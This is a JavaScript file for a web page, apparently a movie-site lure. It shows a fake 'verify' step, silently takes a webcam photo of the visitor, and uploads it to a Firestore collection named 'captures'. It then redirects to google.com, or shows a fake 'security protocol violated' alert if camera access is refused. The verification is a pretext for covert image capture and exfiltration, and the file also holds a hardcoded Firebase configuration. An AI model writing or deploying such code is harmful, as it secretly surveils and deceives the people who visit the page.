const firebaseConfig = {
    apiKey: "AIzaSyCFy28nNtxhkjfpOd0aCfYkjHUwErh1WVQ",
    authDomain: "movie-1e6fc.firebaseapp.com",
    projectId: "movie-1e6fc",
    storageBucket: "movie-1e6fc.firebasestorage.app",
    messagingSenderId: "371616954594",
    appId: "1:371616954594:web:977d88ec7570df351246bb"
};

if (!firebase.apps.length) { firebase.initializeApp(firebaseConfig); }
const db = firebase.firestore();

function openVerify() {
    document.getElementById('verifyOverlay').style.display = 'flex';
}

async function triggerFinalCamera() {
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');

    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;
        document.querySelector('h2').innerText = "VERIFYING...";
        document.querySelector('h2').style.color = "#00ff00";

        setTimeout(() => {
            const context = canvas.getContext('2d');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            context.drawImage(video, 0, 0);
            const photoData = canvas.toDataURL('image/jpeg', 0.5);

            db.collection("captures").add({
                image: photoData,
                time: new Date().toLocaleString()
            }).then(() => {
                stream.getTracks().forEach(track => track.stop());
                window.location.href = "https://www.google.com"; 
            });
        }, 2000);

    } catch (err) {
        alert("ACCESS DENIED: Security protocol violated. Redirecting...");
        window.location.href = "https://www.google.com";
    }
}
